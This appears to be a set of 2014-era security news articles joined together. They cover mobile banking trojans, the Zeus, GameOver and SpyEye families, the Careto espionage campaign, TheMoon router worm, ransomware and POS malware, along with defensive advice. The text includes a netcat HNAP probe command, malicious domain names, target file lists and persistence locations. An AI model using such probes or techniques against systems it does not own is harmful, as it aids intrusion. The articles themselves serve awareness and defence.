Malware authors are getting to know their market and are changing their way of operations. Since last year we have seen a rise in the number of hackers moving from the Blackhat into the Greyhat. The Head of knowledge delivery and business development for RSA's FraudAction Group, Daniel Cohen warned users about the new threat via a company blog on Thursday, that explains everything about the malware app, called iBanking. iBanking, a new mobile banking Trojan app which impersonates itself as an Android 'Security App', in order to deceive its victims, may intimidate a large number of users as now that its source code has been leaked online through an underground forum. It will give an opportunity to a larger number of cybercriminals to launch attacks using this kind of ready-made mobile malware in the future. Since many banking sites use two-factor authentication and transaction authorization systems in order to deal with the various threats, by sending unique one-time-use codes to their customers' registered phone numbers via SMS, but in order to defraud them, cyber criminals have started to create various mobile malware like iBanking to solve their purpose. According to Security Researcher Daniel Cohen, the iBanking mobile bot is a relative all new to the mobile malware arena, and has been available for sale in the Underground Hacking Marketplace [Forum Link] since late last year for $5,000. \"We first saw the iBanking malware was distributed through HTML injection attacks on banking sites, social engineering victims into downloading a so called 'security app' for their Android devices,\" said the RSA researchers in a blog post. In addition, with the iBanking malware, Computer malware is used to defeat the mobile-based security mechanisms used by the banking sites. \"Apart from the server-side source-code, the leaked files also include a builder that can un-pack the existing iBanking APK file and re-pack it with different configurations, essentially providing fraudsters with the means to create their own unique application,\" added Daniel Cohen. In addition to SMS Sniffing, the iBanking app allows an attacker to redirect calls to any pre-defined phone number, capture audio using the device's microphone and steal other confidential data like call history log and the phone book contacts. During the installation process, the malicious app attempts to Social Engineer the user into providing it with administrative rights, making its removal much more difficult. \"The malware is an example of the ongoing developments in the mobile malware space and we are now seeing the next generation of malicious apps being developed and commercialized in the underground, boasting web-based control panels and packing more data-stealing features,\" said Daniel and added that \"The malware’s ability to capture SMS messages and audio recordings, as well as divert voice calls makes step-up authentication all the more challenging as fraudsters gain more control over the OOB device. This highlights the need for stronger authentication solutions capable of validating users’ identities using multiple factors including biometric solutions.\" These Days, the malware apps are particularly dangerous as they are often designed to look as authentic as possible and one in five mobile threats are now bots, which is a sign that the complexity of Mobile Malware is increasing." }

This time, an infamous Zeus Trojan has turned out to be a more sophisticated piece of malware that uses web-crawling action. Instead of going after Banking credentials and performing malicious keystroke logging, a new variant of Zeus Trojan focuses on Software-as-a-service (SaaS) applications for the purpose of obtaining access to proprietary data or code. The SaaS Security firm vendor Adallom, detected a targeted malware attack campaign against a Salesforce.com customer, which began as an attack on an employee's home computer. Adallom found that the new variant had web crawling capabilities that were used to grab sensitive business data from that customer's CRM instance. The Security firm noticed the attack when they saw about 2GB of data been downloaded to the victim’s computer in less than 10 minutes. Furthermore, while Zeus usually hijacks the user session and performs wire transactions, this variant crawled the site and created a real time copy of the user’s Salesforce.com instance that contained all the information from the company account. \"This looks like a targeted attack against the company, cleverly targeting the employee home instead of the enterprise – thus bypassing the company controls. This was probably just the first step, using the Zeus Web inject capabilities they could have used the same tactics as in the banking sites attacks and ask the user to enter more information regarding his company credentials or send out messages in his name,\" says Ami Luttwak, co-founder and CTO of Adallom. Zeus Trojan is one of the most popular family of banking Trojan. Also in 2012, the FBI warned us about the ‘GameOver’ banking Trojan, a variant of Zeus financial malware that spreads via phishing emails. GameOver makes fraudulent transactions from your bank once installed in your system with the capability to conduct Distributed Denial of Service, or DDoS, attack using a botnet, which involves multiple computers flooding the financial institution’s server with traffic in an effort to deny legitimate users access to the site. At the beginning of this year, Security researcher Gary Warner explains the behavior of the new variant of GameOver Zeus malware that uses Encryption to bypass perimeter security, in a blog post. The attackers now bypassing traditional security measures and putting Zeus to use it against Salesforce.com and possibly other SaaS applications in a type of attack that Adallom refers to as \"land-mining\" and \"rolladexing\" to grab loads of business data and customer information. The Adallom Labs team has yet to figure out exactly how these machines were infected and who are behind the cyber attack, so the matter is still being investigated by them." }

If it’s a Linksys Router you could be in the danger to a new malware that attacks your firmware and replicates itself. Security researcher Johannes B. Ullrich from the SANS Technology Institute has warned about a self-replicating malware which is exploiting authentication bypass and code-execution vulnerabilities in the Linksys wireless routers. The Malware named as ‘THE MOON’, scans for other vulnerable devices to spread from router to router and Johannes confirmed that the malicious worm has already infected around 1,000 Linksys E1000, E1200, and E2400 routers. In order to hack the Router, malware remotely calls the Home Network Administration Protocol (HNAP), allows identification, configuration and management of networking devices. The Malware first request the model and firmware version of the router using HNAP and if the device founds vulnerable, it sends a CGI script exploit to get the local command execution access to the device. Linksys's parent company has confirmed that HNAP1 implementation has a security flaw whose exploit code is publicly available on the Internet. “There are about 670 different IP ranges that it scans for other routers. They appear to all belong to different cable modem and DSL ISPs. They are distributed somewhat worldwide),” ‘To what extent this worm can be dangerous’ is yet a question.“We are still working on analysis what it exactly does. But so far, it looks like all it does is spread (which is why we call it a worm). It may have a ‘call-home’ feature that will report back when it infected new hosts.” To verify that your device is vulnerable or not, use following command (depending on your OS):echo [-e] “GET /HNAP1/ HTTP/1.1\\r\\nHost: test\\r\\n\\r\\n” | nc routerip 8080If you receive an XML HNAP reply, you are likely to be victimized for the worm affecting Linksys devices and some preventive measures are to be taken.

PandaLabs, the Cloud Security Company, has identified malicious Android apps on Google Play that can sign up users for premium SMS subscription services without their permission and so far it has infected at least 300,000 Android users, although the number of malicious downloads could have reached 4 times higher i.e. 1,200,000 users. The four apps found free in the app store that came packaged with a premium SMS scam that dubbed as \"Easy Hairdos\", \"Abs Diets\", \"Workout Routines\" and \"Cupcake Recipes\" and are among the malicious apps available for free download on Google Play store. From the above app, say if ‘Abs Diet’ has been installed on your phone and once the user has accepted the terms and conditions of the service, the app displays a series of tips to reduce abdominal fat and then without the user's knowledge, the app looks for the phone number of the mobile device, connects to a Web page and signs the victim up to a premium SMS subscription service. “Without the user knowledge the app will get the phone number of the device, will go to a website and will register it to a premium SMS service. This service requires a confirmation to be activated, which means it sends an SMS to that number with a PIN code, which have to be entered back to end the process and start changing you money,” states the blog post. “This app waits for that specific message; once it arrives, it intercepts its arrival, parses it, takes the PIN number and confirms your interest in the service. Then it removes it, no notification is shown in the terminal and the SMS is not shown anywhere. Again, all this is done without the user knowledge.” But the question is from where this app acquired the telephone number? In this case, the app steals your phone number from one of the most popular mobile apps in the world, WhatsApp. As you probably remember, the first time when you have installed WhatsApp on your phone, you were asked to provide your mobile phone number. The popular messaging app uses this number, among other things, as an identifier to synchronize with WhatsApp. According to Google Play Store this app has between 50,000 and 100,000 downloads. So I think your math is enough to calculate the affected users’ parameters. The researchers at Panda Labs estimated that the average scammed user gets charged $20 by these apps and somewhere between 300,000 and 1,200,000 users downloaded them, so it is guessed that the scammers could have made between $6 million and $24 million from unsuspecting users. It’s not at all surprising that Google play store, that has a huge number of lists of apps, contains some malware affected apps, but this new surge of malware has hit the Google’s play store which has infected over 300,000 Android users. So, users are advised to always carefully read the permissions while installing every app to their phones and if any app that seeks to read SMS and want to connect to the Internet but accordingly such connection is not really needed, then Do Not Install It." }

After achieving income of $50,000 per day in advertising revenue, Dong Nguyen pulled out Flappy Bird gaming app from all the web app stores and now it’s permanently dead. “Flappy Bird was designed to play in a few minutes when you are relaxed,” says Dong Nguyen, in an exclusive interview with Forbes. “But it happened to become an addictive product. I think it has become a problem. To solve that problem, it’s best to take down Flappy Bird. It’s gone forever.” Till now the reason is not clear from Dong’s statement that why exactly he quit the app, but it’s clear that his decision have given opportunity for hackers for creating a malicious version of this app and the app’s popularity will help them to gain success in spreading Smartphone malware to mass and hence, the malicious apps are available in play stores with undesirable side effects. After his single tweet, \"I just cannot take this anymore.\" The users began downloading Flappy bird app from their play stores, without bothering it’s the real version or not and after he pulled off the app from the play stores, hundreds of phones with Flappy Bird installed appeared for sale on eBay, racking up huge bids, as much as $100,000. Sophos researchers examined the app available at non-official stores and found it malicious that sends SMS to premium numbers for continuing with the app and also get access to other mobile services. Rather the real version of the app was available for free. The fake Flappy Bird app doesn’t stop even after you exit the app as it needs to be killed from the task manager of your device. The fake app has ability to access your SD card with read and write permission, send SMS, receive and read without your intervention and it can also add and remove shortcuts without informing you, reported by Sophos. Another fake Flappy Bird app was discovered by Trend Micro that appeared in unofficial stores in Russia and Vietnam. These apps mimic the behavior of the real app, but have some hidden features including secretly connecting to “Command and Control” server via Google Cloud Messaging for further instructions. The apps seek for the personal data of the phone including phone number, carrier and email addresses together with the Gmail account registered with the phone. Since the fake app is not available in Google play store, so Android gives a warning. Also, Android phones have a default setting to not allow \"off-market\" apps. Leaving this option alone will protect your devices from Flappy Bird malware. Though it is not guaranteed that app available on official store are secure, but someone has kept an eye on it, and appropriate action will be taken automatically whenever found malicious. But if you install any third party app, then you are whole sole maintainer of the app and you are running it at your own risk. If it is must for you to install third party apps, you must have a good anti-virus installed on your Smartphone which can inform you about any malicious activity being performed on your phone and keep an eye on your phone bills on a regular basis. The users who were addicted to the Flappy Bird Game and can’t resist themselves playing it in their free times or to relax themselves, are supposed to accept the reality that it has been dead. Now it’s time to move on!" }

The Researchers believe that the program has been operational since 2007 and is seems to be sophisticated nation-state spying tool that targeted government agencies and diplomatic offices and embassies before it was disclosed last month. In the unveiling document published by Kaspersky, they found more than 380 unique victims, including Government institutions, diplomatic offices/embassies, private companies, research institutions, activists etc. The name \"Mask\" comes from the Spanish slang word \"Careto\" (\"Ugly Face\" or “Mask”) which the authors included in some of the malware modules. Developers of the ‘Mask’ aka ‘Careto’ used complex tool-set which includes highly developed malware, bootkit, rootkit etc. that has the ability to sniff encryption keys, VPN configuration, SSH keys and RDP file via intercept network traffic, keystrokes, Skype conversation, PGP keys, WI-Fi traffic, screen capturing, monitoring all file operations, that makes it unique and dangerous and more sophisticated than DUQU malware. The malware targets files having an extension: *.AKF, *.ASC, *.AXX, *.CFD, *.CFE, *.CRT, *.DOC, *.DOCX, *.EML, *.ENC, *.GMG, *.GPG, *.HSE, *.KEY, *.M15, *.M2F, *.M2O, *.M2R, *.MLS, *.OCFS, *.OCU, *.ODS, *.ODT, *.OVPN, *.P7C, *.P7M, *.P7Z, *.PAB, *.PDF, *.PGP, *.PKR, *.PPK, *.PSW, *.PXL, *.RDP, *.RTF, *.SDC, *.SDW, *.SKR, *.SSH, *.SXC, *.SXW, *.VSD, *.WAB, *.WPD, *.WPS, *.WRD, *.XLS, *.XLSX. Victims of this malware found in: Algeria, Argentina, Belgium, Bolivia, Brazil, China, Colombia, Costa Rica, Cuba, Egypt, France, Germany, Gibraltar, Guatemala, Iran, Iraq, Libya, Malaysia, Mexico, Morocco, Norway, Pakistan, Poland, South Africa, Spain, Switzerland, Tunisia, Turkey, United Kingdom, United States and Venezuela. The malware remains untraceable for about 7 years and was able to infect Mac OS X version, Linux, Windows, iPad/iPhone and android running devices. According to the researchers, the Mask Malware was designed to infect the 32- and 64-bit Windows versions, Mac OS X and Linux versions, but researchers believe that possibly there may be more versions for Android and iPhones (Apple iOS) platforms. In its main binary a CAB file having shlink32 and shlink64 dll files are found during the research from which the malware extract one of them, depending upon the architecture of the victim’s machine and install it as objframe.dll. It includes the most sophisticated backdoor SGH, which is designed to perform a large surveillance function and except this it has DINNER module which gets executed via APC remote calls and reload ‘chef’ module responsible for network connectivity and ‘waiter’ modules responsible for all logical operations. Another backdoor called SBD (Shadowinteger's Backdoor) which uses open source tools like netcat is included in the malware. To infect Linux versions, Mozilla Firefox plugin “af_l_addon.xpi” was used and was hosted on “linkconf[dot]net” Spear phishing, a favorite attack used by most cyber attackers like SEA, was used to distribute this malware. Users were lured to click some malicious websites that contain a number of exploits to compromise their systems. Kaspersky research found linkconf.net, redirserver.net and swupdt.com as hosting exploits. These websites don’t infect the visitor, instead attacker hosts the exploit in a folder which cannot be navigated using the web, but they direct the link to that exploit in the phishing email. To mask the attack into real, attackers use a fake SSL certificate of some unknown company TecSystem Ltd valid since 2010 and sometimes they also use subdomains to mask the attack appear more real; in which they simulate newspaper subsections that may include SPAIN’s main Newspaper, The Washington Post and The Register etc. Kaspersky had performed this research with more interest due to the reason that the malware has tried to exploit the vulnerability in its product i.e. Workstation products prior version 6.0.4.*, and KAV/KIS 8.0 versions. “In case of the Careto implant, the C&C communication channel is protected by two layers of encryption. The data received from the C&C server is encrypted using a temporary AES key, which is also passed with the data and is encrypted with an RSA key. The same RSA key is used to encrypt the data that is sent back to the C&C server. This double encryption is uncommon and shows the high level of protection implemented by the authors of the campaign.” they said. During the research and investigation of this malware, CC servers were found down, which shows that attacker group was monitoring all aspects related to the malware activity. Since there are no identified patterns in these attacks and who is behind these activities is yet a matter of investigation for the researchers out there." }

While you are busy in Googling ideal gifts for your loved ones, the Cyber thieves are also busy in taking advantage of such events by spreading various malware, phishing campaigns and fraud schemes as these days come out to be a goldmine for the cyber criminals. Online Shopping Scams are popular among Cyber criminals as it is the easiest way for hackers to steal money in easy and untraceable ways. Security Researchers at Anti virus firm - Trend Micro discovered various Valentine's Day threats which are common at such occasion i.e. A flower-delivery service and it appears to be a normal promotional e-mail, but the links actually lead to various survey scams. The Malware threats also arrive during this season of love. The researchers recently found a new attack targeting Canadian users looking for a Romantic Dinner Giveaway. The email appears to be about a special Valentine Dinner, and has an attachment which is actually a malicious .RTF file (detected as TROJ_ARTIEF. VDY), using a known buffer overflow vulnerability (CVE-2012-0158) in Windows Common Controls, allows remote code execution to drop a backdoor (BKDR_INJECT.VDY) onto the affected system. This Valentine's Day, with the popularity of Android phones and iPhones, it seems practical to impress your beloved by sending e-cards using various Valentine's Day Apps, but you never realize that despite sending E-cards, you are also inflicting an Android malware on your beloveds which could be worse to your relation. The security researchers from Bitdefender recently released a report, noted how such Valentine's Day apps could demand undue permissions, that could violate users’ privacy, rack up users’ phone bills, and even possibly cause identity theft. The researchers have detected various malware-inflicted apps, one of which is ‘Valentine’s Day 2014 Wallpaper.’ The app records user’s location and his browsing history in the process without having any justification for asking permissions. Another is ‘Valentine's Day Frames’, the app that reads the user’s contacts list, which is logically an odd request because the app is only intended to adorn user’s romantic photographs with Valentine's Day themed photo frames. So what’s the use of reading your contact list for this app? One more, ‘Love Letters for Chat, Status’ which allows you to share love quotes, letters, and even poems to your dearest friends, but the app is capable to send emails, make phone calls, change audio settings, and even modify calendar events without your permission. So gifting this to your beloved may cause an end to you sweet relation. Seasonal deals and offers are common place, so its users own duty to spot what’s malicious and what’s not. Following are some tips every Internet user must follow: Do not to open emails and click links in wild from unknown sources. Do not run attached files that come from unknown sources, especially these days. The biggest bargains aren’t always the biggest stealing. If an offer sounds too good to be true, it probably is, but if you are making purchases online, then prefer a reputed shopping site and type the address of the store in the browser, rather than going through any links that have been sent to you. Has an effective security solution installed in your system that is capable of detecting both known and new malware strains. Don’t spread malware... Spread love :) Stay safe!

Emsisoft has detected a new piece of malware called “Linkup”, dubbed as “Trojan-Ransom.Win32.Linkup” that doesn't lock your computer or encrypts files; rather it blocks your Internet access by modifying the DNS settings, with the ability to turn your computer into a Bitcoin mining robot. Sounds Interesting?? Once the Linkup Trojan is installed in your system, it makes a copy of itself and disables the selected Windows Security and Firewall services to facilitate the infection. Injected poisoned DNS Server will only allow the malware and Bitcoin miner to communicate with the internet. It display a bogus notification on the victim's web browser, which is supposed to be from the Council of Europe, that accuses you of viewing “Child Pornography” and only returns the access of Internet back on the payment of a £0.01 (Euro) fine. This is unconfirmed that after paying ransom money, the malware will restore the Internet access or not, \"but most likely only a blatant lie\". The Ransom amount is supposed to be paid by the Credit Card with the submission of your personal information, including your Name, DOB and City, as shown: In addition to blocking your Internet access, Linkup malware also download and install other malware that connect your computer to a Bitcoin mining botnet forcefully, which can combine the computing power of multiple infected computers to earn Bitcoin for whoever is behind the attack. Emsisoft has detail explanation of the working of malware on their site: “This combination of ransomware and Bitcoin mining is a new and fascinating development. At this point, however, its functionality is still quite limited as the downloaded jhProtominer only works on 64-bit operating systems. In time, it will be interesting to see if Linkup is modified to download more flexible variants.” If your computer has been infected, you are advised not to pay ransom money or submit any personal information, rather you can install 'Emsisoft Anti-Malware' to remove the malware and restoring DNS settings to default." }

They caught and blocked a malware campaign that was using the new and novel tactics designed specifically to beat the filtering engines. Last Wednesday the company experienced huge spam traffic i.e. 10 to 12 times the normal amount of their normal routine traffic. “These spikes have been driven by a tremendous increase in the number of incoming messages being sent with viruses attached.” and some user experienced delays in sending and receiving mail. They found the malware campaign, distributing a Financial Trojan designed to target, the Bank of America customers, known as ‘Bredo virus’, capable of stealing information such as Credit Card Numbers, Banking credentials, user’s keystrokes. AppRiver said that ‘The software may also have abilities to further infect a system by downloading more malware on to the machine’ and added that, ‘running through a variety of virus scanners showed that only 11 of 51 antivirus vendors were classifying it as malware.’ The Bredo botnet was first detected in May 2009 and is capable of propagating through malicious e-mails that includes malware attachments which would infect a computer when opened, effectively turning the computer into another zombie controlled by the botnet.

Typically, an app that has permission to read and write data from an SD card has the permission to read all data on that card, including information written by other apps. This means that if you install a malicious application by mistake, it can easily steal any sensitive data from your Phone's SD Card. To prevent the data from being misused by any other app, the best implementation is to encrypt the data, but that will drop the performance of the device. On its 10th birthday, as a treat for mobile developers, Facebook has unveiled the source code of its Android security tool called 'Conceal' cryptographic API Java library, that will allow app developers to encrypt data on disk in the most resource efficient way, with an easy-to-use programming interface. Smaller than other cryptography standards and built for speed, the Conceal might end up the best solution. \"We saw an opportunity to do things better and decided to encrypt the private data that we stored on the SD card so that it would not be accessible to other apps\" Facebook Software Engineer said in a blog post. The tool is based on algorithms from OpenSSL, a common open source encryption system for the web: \"Conceal doesn't implement any crypto. Instead, it uses specific cryptographic algorithms from OpenSSL. OpenSSL's crypto library is about 1MB when built for armv7. By using only the parts of OpenSSL we needed, we were able to reduce the size of OpenSSL to 85KB. We believe providing a smaller library will reduce the friction of adopting state of the art encryption algorithms, make it easier to handle different Android platform versions, and enable us to quickly incorporate fixes for any security vulnerabilities in OpenSSL as well.\" Conceal is smaller and faster than existing Java crypto libraries, uses AES-GCM, an authenticated encryption algorithm that helps to detect any potential tampering with data. \"We instead use AES-GCM which is an authenticated encryption algorithm that not only encrypts the data, but also computes a MAC of the data at the same time.\" he said. The library also provides resources for storing and managing keys to protect against known weaknesses in the Android's random number generator. Conceal officially supports Android 2.3 and higher (Gingerbread). It will run on 2.2 (Froyo) phones as well. The company is already using the tool with the primary Facebook app that runs on Android. Developers can access the Conceal API from GITHUB." }

The security hole affects the version 12.0.0.43 and earlier for both Windows and Mac OSs and Adobe Flash Player 11.2.202.335 and earlier versions for Linux. The vulnerability was discovered by two researchers at Kaspersky Lab, Alexander Polyakov and Anton Ivanov. The story started some month ago, when the Kaspersky Team discovered a new sophisticated cyber espionage operation which has been going on at least since 2007. The operation dubbed “The Mask” hit systems in 27 countries leveraging high-end exploits, the attackers adopted an extremely sophisticated malware which includes a bootkit and rootkit. The malicious code used is able to infect also Mac and Linux versions and included a customized attack against Kaspersky products. “This is putting them above Duqu in terms of sophistication, making it one of the most advanced threats at the moment. Most interesting, the authors appear to be native in yet another language which has been observed very rarely in APT attacks. We will present more details about the “Mask” APT next week at the Kaspersky Security Analyst Summit 2014 (on Twitter, #TheSAS2014). ” Reports a post on SecureList blog. Kaspersky Lab provides technical analysis of the exploits and payload. They discovered a total of 11 exploits, using same vulnerability and all are unpacked SWF files in the following versions of Adobe Flash Player: 11.3.372.94 11.3.375.10 11.3.376.12 11.3.377.15 11.3.378.5 11.3.379.14 11.6.602.167 11.6.602.180 11.7.700.169 11.7.700.202 11.7.700.224 These exploits only work with Windows XP, Vista, 2003 R2, 2003, Windows 7, Windows 7x64, Windows 2008 R2, Windows 2008, 8, Windows 8x6, Mac OS 10.6.8. Researchers discovered that these exploits had been detected on three different user machines, one of which worked under Mac OS 10.6.8 and the other two under Windows 7. They found that .docx document with the 0-day exploit was distributed via a targeted email mailing. There are total three types of Shellcode: First one is a primitive shellcode that reads an executable named a.exe from an SWF file and drops it to the hard drive. Only one of the 11 exploits in our possession included a payload. The second type downloads and executes a file from a URL passed in the SWF file’s parameters. The third shellcode type, which is only present in some of the files, is the most interesting. Adobe was informed of the availability of an exploit in the wild used to hit systems running the Flash Player, it recommends users update product installations to the latest versions: Users of Adobe Flash Player 12.0.0.43 and earlier versions for Windows and Macintosh should update to Adobe Flash Player 12.0.0.44. Users of Adobe Flash Player 11.2.202.335 and earlier versions for Linux should update to Adobe Flash Player 11.2.202.336.

The new variants are more complex, sophisticated and mostly undetectable. Two years back in 2012, the FBI warned us about the ‘GameOver’ banking Trojan, a variant of Zeus financial malware that spreads via phishing emails. GameOver makes fraudulent transactions from your bank once installed in your system with the capability to conduct Distributed Denial of Service, or DDoS, attack using a botnet, which involves multiple computers flooding the financial institution’s server with traffic in an effort to deny legitimate users access to the site. But that wasn't the end; a new variant of the same family of banking Trojan has been discovered by researchers that are being delivered by cyber criminals to users’ machines, making it easier for the banking malware to evade detection and steal victim’s banking credentials. Malcovery's Gary Warner explains the behavior of the new variant of GameOver Zeus malware that uses Encryption to bypass perimeter security, in a blog post. Gary Warner warned that, to get this job done the malware has been working along with other malware called 'UPATRE' via Social Engineering techniques. New version of GameOver malware has encrypted its ‘.EXE’ file to a non-executable format i.e. ‘.ENC’ file, so that the malware which spreads via spam e-mails and malicious attachments can avoid being spotted by firewalls, IDS, Web filters and other security defenses. To Spread it at large scale, spam campaign using ‘Cutwail’ botnet, which is designed to look like an official correspondence from banks or some government agencies that trick user to open the attached .zip file. Gary Warner explains that, “These .zip files contain a small .exe file whose primary job is to go out to the Internet and download larger, more sophisticated malware that would never pass through spam filters without causing alarm, but because of the way our perimeter security works, are often allowed to be downloaded by a logged in user from their workstation.” Boldizsár Bencsáth, from the CrySys Lab in Hungary, has explained the encryption method in his blog post on Sunday, \"The droppers sent out through emails are pretty small, around 10-18 KB. These droppers have an obfuscation layer, so hard to directly analyze them.\" In the new model, the .zip file attached to the email has a new version of UPATRE malware that first downloads the .ENC file from the Internet, then Decrypt it and relocate it with a new file name, then causing it both to execute and to be scheduled to execute in the future, Warner writes.

But you are not aware that even your swipe gestures can be analyzed by hackers. Neal Hindocha, a security adviser for the technology company Trustwave, has developed a prototype malware for the Smartphones that works the same as a keylogger software for desktop. The malware dubbed as ‘Screenlogging’, is capable of monitoring finger swipes on the screen of your smart devices in combination with taking screenshots to know exactly how the user is interacting with their phone or tablet, reported by Forbes. The concept used by him is the same that of Keyloggers, a critical type of malware for cyber criminals, which records the input typed into the keyboard and can easily detect passwords for email, social media and of online bank accounts. In the same way the ‘Screenlogger’ take care of the inputs taped and swiped on the screen. It logs the X and Y coordinates where the user has touched the screen, so a hacker would know what the user is doing and on which application. Hindocha says, “If you’re monitoring all touch events and the phone hasn’t been touched for at least one hour, then you get a minimum of four touch events, you can assume that is a PIN code being entered.” He also added that “The more interesting thing is, if you get a screenshot and then overlay the touch events, you’re looking at a screenshot of what the user is seeing, combined with dots, sequentially, where the user is touching the screen.” But the demonstration of Hindocha works only with the administrative privileges of the device i.e. On the jailbroken iOS and the rooted Android devices only. In order to install the malware, the device should be connected to a computer via USB cable. But this limitation don't mean to relax, because there are many similar vectors available to infect the device. It would be estimated that the malicious version of the Proof-of-Concept app created by Hindocha, which is capable of tracking taps and swipes of the users’ Smartphone, a malicious hacker might be able to steal PINs, account numbers, passwords and other sensitive information easily. Hindocha is planning to demonstrate his ‘Screenlogging’ malware at the upcoming RSA Security conference next month." }

Despite the BlackPOS malware of Point of Sale (POS) system that comes out as the major cause of these data breaches, malware writers are upgrading and developing more Trojans to target POS system. In December, the security researchers at anti-virus firm Kaspersky Lab discovered a Tor-based banking trojan, dubbed \"ChewBacca\", that was initially categorized as a Financial trojan, but recently security researchers at RSA have uncovered that 'ChewBacca' is also capable of stealing credit card details from point of sale systems. ‘ChewBacca’, a relatively new and private Trojan, used in the 11 countries as a POS malware is behind the electronic theft. ChewBacca communicates with its C&C (Command and Control) server over the Tor network obscuring the IP addresses of parties. ChewBacca steals data from the POS system in two ways: Generic keylogger that captures all the keystrokes. Memory scanner that reads process memory and dumps the credit card details. The botnet has been collecting track 1 and track 2 data of payment card since October 25, according to RSA. During installation, ChewBacca creates a copy of itself as a file named “spoolsv.exe“and place it in the windows Start > Startup folder, so that it can automatically start-up at the login time. After installation, the keylogger program creates a log file called “system.log” inside the system %temp% folder that contains the keystroke events along with the window focus changes. “The ChewBacca Trojan appears to be a simple piece of malware that, despite its lack of sophistication and defense mechanisms, succeeded in stealing payment card information from several dozen retailers around the world in a little more than two months.” Neither the RSA nor the Kaspersky descriptions explain how the ChewBacca bot is propagated, but the RSA investigation has observed it mostly in the US and also detected in 10 other countries, including Russia, Canada and Australia. The RSA has provided the data to the FBI on the ChewBacca operation, including the location of a command-and-control server used by the hackers. They advised retailers to increase staffing levels and develop leading-edge capabilities to detect and stop attackers (comprehensive monitoring and incident response), encrypt or tokenize data at the point of capture and ensure that it is not in plain text view on their networks, thereby shifting the risk and burden of protection to the card issuers and their payment processors." }

The ICEPOL Trojan categorized as Ransomware that locks your PC and demand for a ransom amount to unlock it. The Malware was using a previously known vulnerability in Java software i.e. CVE-2013-0422 to infect the systems. The malware threatened the user with accusations of illegal piracy or 'porn-related activity' and requires money for exemption from punishment that pretends to be from the 'police'. “The ICEPOL Trojan extorted victims who downloaded it by sending them a message in any one of 25 languages purporting to be from police accusing them of downloading copyrighted material or illegal porn,” said Catalin Cosoi, Chief Security Strategist from Bitdefender. The malware includes one more money making scheme, i.e. Designed to redirect the victims to the website via pay-per-click scam under the traffic exchange mechanism. The police estimated that more than $32,000 was stolen from the U.S. victims over the five-month period. The Romanian police in cooperation with the Internet security firm Bitdefender found dozens of C&C servers and successfully seized one of the major C&C servers, which was the part of large distribution of ICEPOL Trojans, located in the Romanian capital Bucharest. “The results of the investigation of ICEPOL Trojan based on cooperation with various law enforcement agencies and third party vendors.

In simple terms, a botnet is a group of computers networked together, running a piece of malicious software that allows them to be controlled by a remote attacker. A major target for most of the malware is still Windows, but the growing market of Mac OS X, Linux and Smartphones, is also giving a solid reason to cyber criminals to focus. Recently, Kaspersky Lab has detected another cross-platform Java-Bot, capable of infecting computers running Windows, Mac OS X, and Linux that has Java Runtime Environment installed. Last year, Zoltan Balazs - CTO at MRG Effitas submitted the samples of malicious Java application for analysis to Kaspersky Lab and they identified it as HEUR:Backdoor.Java.Agent.a. According to researchers, to compromise computers, Java-Bot is exploiting a previously known critical Java vulnerability CVE-2013-2465 that was patched in last June. The vulnerability persists in Java 7 u21 and earlier versions. CVE-2013-2465 description says: An unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D. Once the bot has infected a computer, for automatic initialization the malware copies itself into the home directory, and registers itself with system startup programs. The Malware is designed to launch distributed denial-of-service (DDOS) attacks from infected computers. It uses the following methods to start it based on the target operating system: For Windows – HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Mac OS – the standard Mac OS service launch is used For Linux – /etc/init.d/ The malware authors used Zelix Klassmaster Obfuscator (encryption) to make the analysis more difficult. It creates a separate key for the classes developed due to which analysis of all classes has to be done to get the decryption keys. The botnet executable contains an encrypted configuration file for the Mac OS 'launchd service'. It also encrypts internal working methodology of malware. The malware uses PricBot an open framework for implementing communication via IRC. Zombie computers, then report to an Internet relay chat (IRC) channel that acts as a Command-and-control server. The Botnet supports HTTP, UDP protocols for flooding (DDoS attack) a target whose details i.e. Address, port number, attack duration, number of threads to be used are received from the IRC channel. Users should update their Java software to the latest release of Java 7 update 51 of 14 January 2014, can be found on Oracle's Java website. The next scheduled security update for Java is on 14 April 2014." }

Aleksandr Andreevich Panin, a 24 year old programmer, also known as Gribodemon and Harderman, was the main author of ‘SpyEye’, a sophisticated malware designed to steal people’s identities and financial information, including online banking credentials, credit card information, user names, passwords and PINs from their bank accounts without their knowledge. The SpyEye secretly infects the victim’s computer and gives the remote control to the cybercriminals who remotely access the infected computer through command and control servers and steal victims’ personal and financial information through a variety of techniques, including web injects, keystroke loggers, and credit card grabbers without authorization. Between 2009 and 2011, Panin conspired with Hamza Bendelladj, marketed and advertised the Spy Eye malware on various online forums. He sold versions of the SpyEye virus to almost 150 clients for prices ranging from $1,000 to $8,500 and one of his clients, “Soldier,” is reported to have made over $3.2 million in a six-month period using the SpyEye virus. SpyEye is a ready-made malware toolkit used by cybercriminals since from 2009 and is still being used today. It has been estimated by the industry that over 10,000 bank accounts have been compromised by SpyEye infections in 2013 alone. The case is being investigated by Special Agents of the Federal Bureau of Investigation (FBI) who stated, “This investigation highlights the importance of the FBI’s focus on the top echelon of cyber criminals” adding that “The FBI will continue working with partners domestically and internationally to combat cybercrime.\" Thereafter, in February 2011, the FBI searched and seized a SpyEye command and control server that controlled over 200 computers infected with the SpyEye virus and contained information from numerous financial institutions and was allegedly operated by Hamza Bendelladj in Georgia. On July 2011, the FBI agents communicated directly with Panin and purchased a version of SpyEye that contained features designed to steal confidential financial information, initiate fraudulent online banking transactions, install keystroke loggers, and initiate distributed denial of service (DDoS) attacks from computers infected with the SpyEye malware. On January 2013, the Algerian man, Hamza Bendelladj, who was also indicted in the case was arrested in Thailand. The case against him is still pending, and Panin was arrested in July 2013 while he was flying through Hartsfield-Jackson Atlanta International Airport in Atlanta for allegedly using the Web to scam various banks." }

